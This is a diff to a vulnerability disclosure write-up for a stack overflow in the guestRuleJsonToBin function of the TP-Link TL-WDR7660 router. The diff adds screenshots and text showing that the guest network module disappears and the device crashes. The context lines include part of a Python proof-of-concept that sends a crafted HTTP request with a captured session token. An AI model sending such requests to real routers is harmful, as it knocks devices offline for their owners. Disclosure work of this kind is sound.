@@ -1,6 +1,8 @@
 **A stack overflow vulnerability exists in TL-WDR7660 version: TL-WDR7660 ver1.0**
 The guestRuleJsonToBin function handles the important parameter string name without checking it. It can lead to stack overflow vulnerabilities.
 
+![image](image/1.png)
+
 **Exploit a vulnerability in the guestRuleJsonToBin function by sending a carefully constructed HTTP request**
 ```
 url = "http://192.168.1.1/stok=B*qqlvYTn(bVsXtuytGm%2B0%5EP3nOE0dF~/ds " #COOKIE需要对应捕获
@@ -24,3 +26,15 @@ print(response.text)
 ```
 
 **The following figure shows the result**
+
+***(1)Before the above code is executed, the guest network runs normally, as shown in the following figure***
+
+![image](image/2.png)
+
+***(2)After executing the above code, modifying the guest network again shows that the request failed.***
+
+![image](image/3.png)
+
+***(3)After the refresh, the guest network module disappears and the system crashes***
+
+![image](image/4.png)
